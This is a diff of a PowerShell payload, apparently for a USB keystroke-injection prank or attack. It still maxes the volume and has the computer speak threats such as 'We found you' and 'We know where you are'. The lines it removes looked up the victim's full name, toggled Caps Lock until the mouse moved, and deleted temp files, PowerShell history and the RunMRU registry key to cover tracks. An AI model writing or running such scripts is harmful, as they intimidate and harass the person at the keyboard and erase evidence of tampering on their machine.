@@ -32,50 +32,10 @@ Catch {
     Write-Host "Error sending email: $_"
 }
 
-function Get-fullName {
-
-    try {
-
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
-
-    }
- 
- # If no name is detected function will return $env:UserName 
-
-    # Write Error is just for troubleshooting 
-    catch {Write-Error "No name was detected" 
-    return $env:UserName
-    -ErrorAction SilentlyContinue
-    }
-
-    return $fullName 
-
-}
-
-$FN = Get-fullName
-
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
-        }
-    }
-echo "it worked"
-
 $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 $s=New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
-$s.Speak("We found you $FN")
+$s.Speak("We found you")
 $s.Speak("We know where you are")
 $s.Speak("We are everywhere")
 $s.Speak("Expect us")
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
